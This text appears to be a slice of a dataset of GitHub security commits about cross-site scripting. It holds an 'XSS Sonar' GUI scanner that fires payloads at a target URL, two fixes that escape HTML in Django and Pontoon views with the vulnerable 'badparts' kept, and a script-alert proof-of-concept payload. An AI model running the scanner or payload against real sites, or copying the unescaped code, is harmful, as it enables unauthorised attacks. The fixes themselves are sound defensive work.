blue').grid(row=8) Label(main, text=\"\",background='light sky blue').grid(row=9) Label(main, text=\"\",background='light sky blue').grid(row=10) ua=[\"\"] ua+=bane.ua li=bane.read_file('xss.txt') pl=[] for x in li: pl.append(x.strip()) prox=[\"\"] prox+=bane.http(200) global target target=Entry(main) target.insert(0,'http://') global cookie cookie=Entry(main) global method method=ttk.Combobox(main, values=[\"GET & POST\", \"GET\", \"POST\"]) global timeout timeout=ttk.Combobox(main, values=range(1,61)) timeout.current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1) global payload payload=ttk.Combobox(main, values=pl) payload.current(0) global proxy proxy=ttk.Combobox(main, values=prox) global refresh refresh=ttk.Combobox(main, values=[\"On\", \"Off\"]) global crawl crawl=ttk.Combobox(main, values=[\"On\", \"Off\"]) target.grid(row=0, column=1) target.config(width=30) cookie.grid(row=1, column=1) cookie.config(width=30) method.grid(row=2, column=1) method.current(0) method.config(width=30) timeout.grid(row=3, column=1) timeout.config(width=30) user_agent.grid(row=4, column=1) user_agent.config(width=30) payload.grid(row=5, column=1) payload.config(width=30) proxy.grid(row=6, column=1) proxy.current(0) proxy.config(width=30) refresh.grid(row=7, column=1) refresh.current(1) refresh.config(width=30) crawl.grid(row=8, column=1) crawl.current(0) crawl.config(width=30) Button(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4) Button(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4) Button(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4) Label(main, text=\"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row=12,column=1) mainloop() ", "sourceWithComments": "import sys,threading,time\nfrom datetime import datetime\ntry:\n from tkinter import *\n from tkinter import ttk\nexcept:\n print(\"You need to install: tkinter\")\n sys.exit()\ntry:\n import bane\nexcept:\n print(\"You need to install: bane\")\n sys.exit()\n\nclass sc(threading.Thread):\n def run(self):\n  global stop\n  ti=time.time()\n  print(\"=\"*25)\n  print(\"\\n[*]Target: {}\\n[*]Date: {}\".format(target.get(),datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\")))\n  crl=[target.get()]\n  if crawl.get()=='On':\n   crl+=bane.crawl(target.get(),bypass=True)\n  pr=proxy.get()\n  if len(pr)==0:\n   pr=None\n  if method.get()==\"GET\":\n   get=True\n   post=False\n  elif method.get()==\"POST\":\n   get=False\n   post=True\n  else:\n   get=True\n   post=True\n  fresh=False\n  if refresh.get()==\"On\":\n   fresh=True\n  ck=None\n  c=cookie.get()\n  if len(c)>0:\n   ck=c\n  for x in crl:\n   if stop==True:\n    break\n   print(\"[*]URL: {}\".format(x))\n   bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck)\n  print(\"[*]Test was finished at: {}\\n[*]Duration: {} seconds\\n\".format(datetime.now().strftime(\"%d/%m/%Y %H:%M:%S\"),int(time.time()-ti)))\n  print(\"=\"*25)\n\nstop=False\n\ndef scan():\n sc().start()\n\nclass ki(threading.Thread):\n def run(self):\n  global stop\n  stop=True\n\ndef kill():\n ki().start()\n\nmain = Tk()\nmain.title(\"XSS Sonar\")\nmain.configure(background='light sky blue')\nLabel(main, text = \"Target:\",background='light sky blue').grid(row=0)\nLabel(main, text = \"Cookie: (Optional)\",background='light sky blue').grid(row=1)\nLabel(main, text = \"Method:\",background='light sky blue').grid(row=2)\nLabel(main, text = \"Timeout:\",background='light sky blue').grid(row=3)\nLabel(main, text = \"User-Agent:\",background='light sky blue').grid(row=4)\nLabel(main, text = \"Payload:\",background='light sky blue').grid(row=5)\nLabel(main, text = \"HTTP Proxy:\",background='light sky blue').grid(row=6)\nLabel(main, text = \"Refresh:\",background='light sky blue').grid(row=7)\nLabel(main, text = \"Crawl\",background='light sky blue').grid(row=8)\nLabel(main, text = \"\",background='light sky blue').grid(row=9)\nLabel(main, text = \"\",background='light sky blue').grid(row=10)\n\nua=[\"\"]\nua+=bane.ua\nli=bane.read_file('xss.txt')\npl=[]\nfor x in li:\n pl.append(x.strip())\nprox=[\"\"]\nprox+=bane.http(200)\nglobal target\ntarget = Entry(main)\ntarget.insert(0,'http://')\nglobal cookie\ncookie=Entry(main)\nglobal method\nmethod= ttk.Combobox(main, values=[\"GET & POST\", \"GET\", \"POST\"])\nglobal timeout\ntimeout=ttk.Combobox(main, values=range(1,61))\ntimeout.current(14)\nglobal user_agent\nuser_agent=ttk.Combobox(main, values=ua)\nuser_agent.current(1)\nglobal payload\npayload = ttk.Combobox(main, values=pl)\npayload.current(0)\nglobal proxy\nproxy=ttk.Combobox(main, values=prox)\nglobal refresh\nrefresh=ttk.Combobox(main, values=[\"On\", \"Off\"])\nglobal crawl\ncrawl=ttk.Combobox(main, values=[\"On\", \"Off\"])\n\ntarget.grid(row=0, column=1)\ntarget.config(width=30)\ncookie.grid(row=1, column=1)\ncookie.config(width=30)\nmethod.grid(row=2, column=1)\nmethod.current(0)\nmethod.config(width=30)\ntimeout.grid(row=3, column=1)\ntimeout.config(width=30)\nuser_agent.grid(row=4, column=1)\nuser_agent.config(width=30)\npayload.grid(row=5, column=1)\npayload.config(width=30)\nproxy.grid(row=6, column=1)\nproxy.current(0)\nproxy.config(width=30)\nrefresh.grid(row=7, column=1)\nrefresh.current(1)\nrefresh.config(width=30)\ncrawl.grid(row=8, column=1)\ncrawl.current(0)\ncrawl.config(width=30)\n\nButton(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4)\nButton(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4)\nButton(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4)\nLabel(main, text = \"\\n\\nCoder: Ala Bouali\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row=12,column=1)\nmainloop()\n"}}, "msg": "Update xss.py"}}, "https://github.com/Cheng-mq1216/production-practice": {"333dc34f5feada55d1f6ff1255949ca00dec0f9c": {"url": "https://api.github.com/repos/Cheng-mq1216/production-practice/commits/333dc34f5feada55d1f6ff1255949ca00dec0f9c", "html_url": "https://github.com/Cheng-mq1216/production-practice/commit/333dc34f5feada55d1f6ff1255949ca00dec0f9c", "message": ":fire: SAFETY CHANGE\n\n\u66f4\u65b0\u4e86markdown\u6e32\u67d3\u7b56\u7565\u3002\u9632\u6b62XSS\u6ce8\u5165\u3002", "sha": "333dc34f5feada55d1f6ff1255949ca00dec0f9c", "keyword": "XSS change", "diff": "diff --git a/app/Index/forms.py b/app/Index/forms.py\ndeleted file mode 100644\nindex e69de29..0000000\ndiff --git a/app/Index/views.py b/app/Index/views.py\nindex 05263ea..f92e8e2 100644\n--- a/app/Index/views.py\n+++ b/app/Index/views.py\n@@ -27,11 +27,28 @@\n \n # \u5bfc\u5165Markdown\u6e32\u67d3\u63d2\u4ef6\n from markdown import markdown\n+from markdown.extensions import Extension\n \n # \u5bfc\u5165\u6a21\u578b\n from .models import Article, Category, Comment\n \n \n+class EscapeHtml(Extension):\n+    def extendMarkdown(self, md):\n+        md.preprocessors.deregister('html_block')\n+        md.inlinePatterns.deregister('html')\n+\n+\n+def safe_md(string):\n+    return markdown(string,\n+                    extensions=[\n+                        'markdown.extensions.extra',\n+                        'markdown.extensions.codehilite',\n+                        'markdown.extensions.toc',\n+                        EscapeHtml()\n+                    ], safe_mode=True)\n+\n+\n class ArticleForm(forms.ModelForm):\n     class Meta:\n         model = Article\n@@ -77,11 +94,7 @@ class ArticlesList(ListView):\n     def get_queryset(self, **kwargs):\n         queryset = Article.objects.order_by('-time')\n         for i in queryset:\n-            i.md = markdown(i.content, extensions=[\n-                'markdown.extensions.extra',\n-                'markdown.extensions.codehilite',\n-                'markdown.extensions.toc',\n-            ])\n+            i.md = safe_md(i.content)\n \n         return queryset\n \n@@ -104,12 +117,7 @@ def get_context_data(self, **kwargs):\n         context = super().get_context_data(**kwargs)\n         context['comments'] = self.object.comment_set.all().order_by('-time')\n         context['form'] = self.get_form()\n-        context['md'] = markdown(self.object.content,\n-                                 extensions=[\n-                                     'markdown.extensions.extra',\n-                                     'markdown.extensions.codehilite',\n-                                     'markdown.extensions.toc',\n-                                 ])\n+        context['md'] = safe_md(self.object.content)\n \n         return context\n \n", "files": {"/app/Index/views.py": {"changes": [{"diff": "\n     def get_queryset(self, **kwargs):\n         queryset = Article.objects.order_by('-time')\n         for i in queryset:\n-            i.md = markdown(i.content, extensions=[\n-                'markdown.extensions.extra',\n-                'markdown.extensions.codehilite',\n-                'markdown.extensions.toc',\n-            ])\n+            i.md = safe_md(i.content)\n \n         return queryset\n \n", "add": 1, "remove": 5, "filename": "/app/Index/views.py", "badparts": ["            i.md = markdown(i.content, extensions=[", "                'markdown.extensions.extra',", "                'markdown.extensions.codehilite',", "                'markdown.extensions.toc',", "            ])"], "goodparts": ["            i.md = safe_md(i.content)"]}, {"diff": "\n         context = super().get_context_data(**kwargs)\n         context['comments'] = self.object.comment_set.all().order_by('-time')\n         context['form'] = self.get_form()\n-        context['md'] = markdown(self.object.content,\n-                                 extensions=[\n-                                     'markdown.extensions.extra',\n-                                     'markdown.extensions.codehilite',\n-                                     'markdown.extensions.toc',\n-                                 ])\n+        context['md'] = safe_md(self.object.content)\n \n         return context\n \n", "add": 1, "remove": 6, "filename": "/app/Index/views.py", "badparts": ["        context['md'] = markdown(self.object.content,", "                                 extensions=[", "                                     'markdown.extensions.extra',", "                                     'markdown.extensions.codehilite',", "                                     'markdown.extensions.toc',", "                                 ])"], "goodparts": ["        context['md'] = safe_md(self.object.content)"]}], "source": "\n\nimport hashlib from django import forms from django.contrib.auth import authenticate, login, logout from django.contrib.auth.forms import UserCreationForm, PasswordChangeForm from django.contrib.auth.models import User from django.contrib.auth.decorators import login_required from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin from django.core.paginator import EmptyPage, PageNotAnInteger, Paginator from django.http import HttpResponse from django.urls import reverse from django.template import RequestContext from django.shortcuts import Http404, redirect, render, render_to_response from django.views.generic import ListView, DetailView from django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin from markdown import markdown from.models import Article, Category, Comment class ArticleForm(forms.ModelForm): class Meta: model=Article fields=['title', 'category', 'content'] class CommentForm(forms.ModelForm): class Meta: model=Comment fields=['content'] class UserDetail(DetailView): model=User template_name='user.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['articles']=self.object.article_set.all() context['form']=CommentForm() return context class RegisterFormView(FormView): \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\" template_name='register.html' form_class=UserCreationForm success_url='/login/' def form_valid(self, form): \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\" form.save() return super().form_valid(form) class ArticlesList(ListView): \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\" model=Article context_object_name='articles' template_name='index.html' paginate_by=5 def get_queryset(self, **kwargs): queryset=Article.objects.order_by('-time') for i in queryset: i.md=markdown(i.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return queryset class ArticleDetail(DetailView, FormMixin): \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002 \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002 \"\"\" model=Article context_object_name='article' template_name='details.html' form_class=CommentForm def get_success_url(self): return reverse('article-detail', kwargs={'pk': self.object.pk}) def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['comments']=self.object.comment_set.all().order_by('-time') context['form']=self.get_form() context['md']=markdown(self.object.content, extensions=[ 'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return context def post(self, request, *args, **kwargs): self.object=self.get_object() form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.form_invalid(form) def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.article=self.object a.save() return super().form_valid(form) def is_mobile(useragent): devices=[\"Android\", \"iPhone\", \"SymbianOS\", \"Windows Phone\", \"iPad\", \"iPod\"] for d in devices: if d in useragent: return True return False class ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name='articles' form_class=ArticleForm success_url='/' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def form_valid(self, form): a=form.save(commit=False) a.author=self.request.user a.save() return super().form_valid(form) class ArticleUpdateView(UserPassesTestMixin, UpdateView): \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article success_url='/' fields=['content', 'category'] template_name='update.html' def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def test_func(self): return self.request.user==self.get_object().author class ArticleDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\" model=Article success_url='/' def test_func(self): return self.request.user==self.get_object().author class CommentDelete(UserPassesTestMixin, DeleteView): \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\" model=Comment def get_success_url(self): return reverse('article-detail', kwargs={'pk': self.object.article.pk}) def test_func(self): return self.request.user==self.get_object().author ", "sourceWithComments": "# \u52a0\u5bc6\u7b97\u6cd5\u5305\nimport hashlib\n\nfrom django import forms\n\n# \u5bfc\u5165\u6743\u9650\u63a7\u5236\u7c7b\nfrom django.contrib.auth import authenticate, login, logout\nfrom django.contrib.auth.forms import UserCreationForm, PasswordChangeForm\nfrom django.contrib.auth.models import User\nfrom django.contrib.auth.decorators import login_required\nfrom django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin\n\n# \u5bfc\u5165\u5206\u9875\u63d2\u4ef6\u5305\nfrom django.core.paginator import EmptyPage, PageNotAnInteger, Paginator\nfrom django.http import HttpResponse\nfrom django.urls import reverse\n\n# \u5bfc\u5165\u8bf7\u6c42\u4e0a\u4e0b\u6587\u6a21\u7248\nfrom django.template import RequestContext\n\n# \u5bfc\u5165\u5feb\u6377\u51fd\u6570\nfrom django.shortcuts import Http404, redirect, render, render_to_response\n\n# \u5bfc\u5165\u6a21\u578b\u89c6\u56fe\nfrom django.views.generic import ListView, DetailView\nfrom django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin\n\n# \u5bfc\u5165Markdown\u6e32\u67d3\u63d2\u4ef6\nfrom markdown import markdown\n\n# \u5bfc\u5165\u6a21\u578b\nfrom .models import Article, Category, Comment\n\n\nclass ArticleForm(forms.ModelForm):\n    class Meta:\n        model = Article\n        fields = ['title', 'category', 'content']\n\n\nclass CommentForm(forms.ModelForm):\n    class Meta:\n        model = Comment\n        fields = ['content']\n\n\nclass UserDetail(DetailView):\n    model = User\n    template_name = 'user.html'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['articles'] = self.object.article_set.all()\n        context['form'] = CommentForm()\n        return context\n\n\nclass RegisterFormView(FormView):\n    \"\"\"\u6ce8\u518c\u9875\u9762\u3002\u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u521b\u5efa\u7528\u6237\u8868\u5355\u3002\"\"\"\n    template_name = 'register.html'\n    form_class = UserCreationForm\n    success_url = '/login/'\n\n    def form_valid(self, form):\n        \"\"\"\u6821\u9a8c\u6210\u529f\uff0c\u4fdd\u5b58\u7528\u6237\u3002\"\"\"\n        form.save()\n        return super().form_valid(form)\n\n\nclass ArticlesList(ListView):\n    \"\"\"\u5904\u7406\u591a\u7bc7\u6587\u7ae0\u7684\u663e\u793a\u3002\"\"\"\n    model = Article\n    context_object_name = 'articles'\n    template_name = 'index.html'\n    paginate_by = 5\n\n    def get_queryset(self, **kwargs):\n        queryset = Article.objects.order_by('-time')\n        for i in queryset:\n            i.md = markdown(i.content, extensions=[\n                'markdown.extensions.extra',\n                'markdown.extensions.codehilite',\n                'markdown.extensions.toc',\n            ])\n\n        return queryset\n\n\nclass ArticleDetail(DetailView, FormMixin):\n    \"\"\"\u5904\u7406\u5355\u7bc7\u6587\u7ae0\u8be6\u60c5\u9875\u7684\u663e\u793a\u3002\n    \u4ee5\u53ca\u6240\u6709\u7559\u8a00\u7684\u663e\u793a\n    FormMixin \u5904\u7406\u7559\u8a00\u7684\u4e0a\u4f20 \u3002\n    \"\"\"\n    model = Article\n    # model.content = markdown(model.content)\n    context_object_name = 'article'\n    template_name = 'details.html'\n    form_class = CommentForm\n\n    def get_success_url(self):\n        return reverse('article-detail', kwargs={'pk': self.object.pk})\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['comments'] = self.object.comment_set.all().order_by('-time')\n        context['form'] = self.get_form()\n        context['md'] = markdown(self.object.content,\n                                 extensions=[\n                                     'markdown.extensions.extra',\n                                     'markdown.extensions.codehilite',\n                                     'markdown.extensions.toc',\n                                 ])\n\n        return context\n\n    def post(self, request, *args, **kwargs):\n        self.object = self.get_object()\n        form = self.get_form()\n        if form.is_valid():\n            return self.form_valid(form)\n        else:\n            return self.form_invalid(form)\n\n    def form_valid(self, form):\n        a = form.save(commit=False)\n        a.author = self.request.user\n        a.article = self.object\n        a.save()\n        return super().form_valid(form)\n\n\ndef is_mobile(useragent):\n    devices = [\"Android\", \"iPhone\", \"SymbianOS\",\n               \"Windows Phone\", \"iPad\", \"iPod\"]\n\n    for d in devices:\n        if d in useragent:\n            return True\n\n    return False\n\n\nclass ArticleFormView(LoginRequiredMixin, FormView):\n    \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\"\n\n    model = Article\n    template_name = 'post.html'\n    context_object_name = 'articles'\n    form_class = ArticleForm\n    success_url = '/'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])\n        return context\n\n    def form_valid(self, form):\n        a = form.save(commit=False)\n        a.author = self.request.user\n        a.save()\n        return super().form_valid(form)\n\n\nclass ArticleUpdateView(UserPassesTestMixin, UpdateView):\n    \"\"\"\u5904\u7406\u66f4\u65b0 Article \u65f6\u7684\u8868\u5355\"\"\"\n    model = Article\n    success_url = '/'\n    fields = ['content', 'category']\n    template_name = 'update.html'\n\n    def get_context_data(self, **kwargs):\n        context = super().get_context_data(**kwargs)\n        context['is_mobile'] = is_mobile(self.request.META['HTTP_USER_AGENT'])\n        return context\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n\n\nclass ArticleDelete(UserPassesTestMixin, DeleteView):\n    \"\"\"\u5904\u7406\u5220\u9664Article\u7684\u64cd\u4f5c\"\"\"\n    model = Article\n    success_url = '/'\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n\n\nclass CommentDelete(UserPassesTestMixin, DeleteView):\n    \"\"\"\u5220\u9664\u8bc4\u8bba\u7684\u64cd\u4f5c\"\"\"\n    model = Comment\n\n    def get_success_url(self):\n        return reverse('article-detail', kwargs={'pk': self.object.article.pk})\n\n    def test_func(self):\n        return self.request.user == self.get_object().author\n"}}, "msg": ":fire: SAFETY CHANGE\n\n\u66f4\u65b0\u4e86markdown\u6e32\u67d3\u7b56\u7565\u3002\u9632\u6b62XSS\u6ce8\u5165\u3002"}}, "https://github.com/onefork/pontoon-sr": {"fc07ed9c68e08d41f74c078b4e7727f1a0888be8": {"url": "https://api.github.com/repos/onefork/pontoon-sr/commits/fc07ed9c68e08d41f74c078b4e7727f1a0888be8", "html_url": "https://github.com/onefork/pontoon-sr/commit/fc07ed9c68e08d41f74c078b4e7727f1a0888be8", "sha": "fc07ed9c68e08d41f74c078b4e7727f1a0888be8", "keyword": "XSS vulnerable", "diff": "diff --git a/pontoon/batch/views.py b/pontoon/batch/views.py\nindex 0952f6dd..72afa80f 100644\n--- a/pontoon/batch/views.py\n+++ b/pontoon/batch/views.py\n@@ -112,7 +112,7 @@ def batch_edit_translations(request):\n     \"\"\"\n     form = forms.BatchActionsForm(request.POST)\n     if not form.is_valid():\n-        return HttpResponseBadRequest(form.errors.as_json())\n+        return HttpResponseBadRequest(form.errors.as_json(escape_html=True))\n \n     locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])\n     entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])\n", "message": "", "files": {"/pontoon/batch/views.py": {"changes": [{"diff": "\n     \"\"\"\n     form = forms.BatchActionsForm(request.POST)\n     if not form.is_valid():\n-        return HttpResponseBadRequest(form.errors.as_json())\n+        return HttpResponseBadRequest(form.errors.as_json(escape_html=True))\n \n     locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])\n     entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])\n", "add": 1, "remove": 1, "filename": "/pontoon/batch/views.py", "badparts": ["        return HttpResponseBadRequest(form.errors.as_json())"], "goodparts": ["        return HttpResponseBadRequest(form.errors.as_json(escape_html=True))"]}], "source": "\nimport logging from bulk_update.helper import bulk_update from django.contrib.auth.decorators import login_required from django.db import transaction from django.http import( HttpResponseBadRequest, HttpResponseForbidden, JsonResponse, ) from django.shortcuts import get_object_or_404 from django.views.decorators.http import( require_POST ) from pontoon.base.models import( ChangedEntityLocale, Entity, Locale, Project, ProjectLocale, TranslationMemoryEntry, Translation, ) from pontoon.base.utils import( require_AJAX, readonly_exists, ) from pontoon.batch import forms from pontoon.batch.actions import ACTIONS_FN_MAP log=logging.getLogger(__name__) def update_stats(translated_resources, locale): \"\"\"Update stats on a list of TranslatedResource. \"\"\" projects=set() for translated_resource in translated_resources: projects.add(translated_resource.resource.project) translated_resource.calculate_stats(save=False) bulk_update(translated_resources, update_fields=[ 'total_strings', 'approved_strings', 'fuzzy_strings', 'strings_with_errors', 'strings_with_warnings', 'unreviewed_strings', ]) locale.aggregate_stats() for project in projects: project.aggregate_stats() ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats() def mark_changed_translation(changed_entities, locale): \"\"\"Mark entities as changed, for later sync. \"\"\" changed_entities_array=[] existing=( ChangedEntityLocale.objects .values_list('entity', 'locale') .distinct() ) for changed_entity in changed_entities: key=(changed_entity.pk, locale.pk) if key not in existing: changed_entities_array.append( ChangedEntityLocale(entity=changed_entity, locale=locale) ) ChangedEntityLocale.objects.bulk_create(changed_entities_array) def update_translation_memory(changed_translation_pks, project, locale): \"\"\"Update translation memory for a list of translations. \"\"\" memory_entries=[ TranslationMemoryEntry( source=t.entity.string, target=t.string, locale=locale, entity=t.entity, translation=t, project=project, ) for t in( Translation.objects .filter(pk__in=changed_translation_pks) .prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create(memory_entries) @login_required(redirect_field_name='', login_url='/403') @require_POST @require_AJAX @transaction.atomic def batch_edit_translations(request): \"\"\"Perform an action on a list of translations. Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view are defined in `models.BatchActionsForm`. \"\"\" form=forms.BatchActionsForm(request.POST) if not form.is_valid(): return HttpResponseBadRequest(form.errors.as_json()) locale=get_object_or_404(Locale, code=form.cleaned_data['locale']) entities=Entity.objects.filter(pk__in=form.cleaned_data['entities']) if not entities.exists(): return JsonResponse({'count': 0}) projects_pk=entities.values_list('resource__project__pk', flat=True) projects=Project.objects.filter(pk__in=projects_pk.distinct()) for project in projects: if( not request.user.can_translate(project=project, locale=locale) or readonly_exists(projects, locale) ): return HttpResponseForbidden( \"Forbidden: You don't have permission for batch editing\" ) active_translations=Translation.objects.filter( active=True, locale=locale, entity__in=entities, ) action_function=ACTIONS_FN_MAP[form.cleaned_data['action']] action_status=action_function( form, request.user, active_translations, locale, ) if action_status.get('error'): return JsonResponse(action_status) invalid_translation_count=len(action_status.get('invalid_translation_pks',[])) if action_status['count']==0: return JsonResponse({ 'count': 0, 'invalid_translation_count': invalid_translation_count, }) update_stats(action_status['translated_resources'], locale) mark_changed_translation(action_status['changed_entities'], locale) if action_status['latest_translation_pk']: Translation.objects.get( pk=action_status['latest_translation_pk'] ).update_latest_translation() update_translation_memory( action_status['changed_translation_pks'], project, locale ) return JsonResponse({ 'count': action_status['count'], 'invalid_translation_count': invalid_translation_count, }) ", "sourceWithComments": "import logging\n\nfrom bulk_update.helper import bulk_update\n\nfrom django.contrib.auth.decorators import login_required\nfrom django.db import transaction\nfrom django.http import (\n    HttpResponseBadRequest,\n    HttpResponseForbidden,\n    JsonResponse,\n)\nfrom django.shortcuts import get_object_or_404\nfrom django.views.decorators.http import (\n    require_POST\n)\n\nfrom pontoon.base.models import (\n    ChangedEntityLocale,\n    Entity,\n    Locale,\n    Project,\n    ProjectLocale,\n    TranslationMemoryEntry,\n    Translation,\n)\nfrom pontoon.base.utils import (\n    require_AJAX,\n    readonly_exists,\n)\nfrom pontoon.batch import forms\nfrom pontoon.batch.actions import ACTIONS_FN_MAP\n\n\nlog = logging.getLogger(__name__)\n\n\ndef update_stats(translated_resources, locale):\n    \"\"\"Update stats on a list of TranslatedResource.\n    \"\"\"\n    projects = set()\n    for translated_resource in translated_resources:\n        projects.add(translated_resource.resource.project)\n        translated_resource.calculate_stats(save=False)\n\n    bulk_update(translated_resources, update_fields=[\n        'total_strings',\n        'approved_strings',\n        'fuzzy_strings',\n        'strings_with_errors',\n        'strings_with_warnings',\n        'unreviewed_strings',\n    ])\n\n    locale.aggregate_stats()\n\n    for project in projects:\n        project.aggregate_stats()\n        ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats()\n\n\ndef mark_changed_translation(changed_entities, locale):\n    \"\"\"Mark entities as changed, for later sync.\n    \"\"\"\n    changed_entities_array = []\n    existing = (\n        ChangedEntityLocale.objects\n        .values_list('entity', 'locale')\n        .distinct()\n    )\n    for changed_entity in changed_entities:\n        key = (changed_entity.pk, locale.pk)\n\n        # Remove duplicate changes to prevent unique constraint violation.\n        if key not in existing:\n            changed_entities_array.append(\n                ChangedEntityLocale(entity=changed_entity, locale=locale)\n            )\n\n    ChangedEntityLocale.objects.bulk_create(changed_entities_array)\n\n\ndef update_translation_memory(changed_translation_pks, project, locale):\n    \"\"\"Update translation memory for a list of translations.\n    \"\"\"\n    memory_entries = [\n        TranslationMemoryEntry(\n            source=t.entity.string,\n            target=t.string,\n            locale=locale,\n            entity=t.entity,\n            translation=t,\n            project=project,\n        ) for t in (\n            Translation.objects\n            .filter(pk__in=changed_translation_pks)\n            .prefetch_related('entity__resource')\n        )\n    ]\n    TranslationMemoryEntry.objects.bulk_create(memory_entries)\n\n\n@login_required(redirect_field_name='', login_url='/403')\n@require_POST\n@require_AJAX\n@transaction.atomic\ndef batch_edit_translations(request):\n    \"\"\"Perform an action on a list of translations.\n\n    Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view\n    are defined in `models.BatchActionsForm`.\n\n    \"\"\"\n    form = forms.BatchActionsForm(request.POST)\n    if not form.is_valid():\n        return HttpResponseBadRequest(form.errors.as_json())\n\n    locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])\n    entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])\n\n    if not entities.exists():\n        return JsonResponse({'count': 0})\n\n    # Batch editing is only available to translators. Check if user has\n    # translate permissions for all of the projects in passed entities.\n    # Also make sure projects are not enabled in read-only mode for a locale.\n    projects_pk = entities.values_list('resource__project__pk', flat=True)\n    projects = Project.objects.filter(pk__in=projects_pk.distinct())\n\n    for project in projects:\n        if (\n            not request.user.can_translate(project=project, locale=locale)\n            or readonly_exists(projects, locale)\n        ):\n            return HttpResponseForbidden(\n                \"Forbidden: You don't have permission for batch editing\"\n            )\n\n    # Find all impacted active translations, including plural forms.\n    active_translations = Translation.objects.filter(\n        active=True,\n        locale=locale,\n        entity__in=entities,\n    )\n\n    # Execute the actual action.\n    action_function = ACTIONS_FN_MAP[form.cleaned_data['action']]\n    action_status = action_function(\n        form,\n        request.user,\n        active_translations,\n        locale,\n    )\n\n    if action_status.get('error'):\n        return JsonResponse(action_status)\n\n    invalid_translation_count = len(action_status.get('invalid_translation_pks', []))\n    if action_status['count'] == 0:\n        return JsonResponse({\n            'count': 0,\n            'invalid_translation_count': invalid_translation_count,\n        })\n\n    update_stats(action_status['translated_resources'], locale)\n    mark_changed_translation(action_status['changed_entities'], locale)\n\n    # Update latest translation.\n    if action_status['latest_translation_pk']:\n        Translation.objects.get(\n            pk=action_status['latest_translation_pk']\n        ).update_latest_translation()\n\n    update_translation_memory(\n        action_status['changed_translation_pks'],\n        project,\n        locale\n    )\n\n    return JsonResponse({\n        'count': action_status['count'],\n        'invalid_translation_count': invalid_translation_count,\n    })\n"}}, "msg": "Fix an XSS vulnerability in batch/views.py\n\nAs a Proof of Concept consider an AJAX POST request to\nhttps://pontoon.mozilla.org/batch-edit-translations/ with\n\"action\" parameter set to \"<script>alert('xss')</script>\"."}}}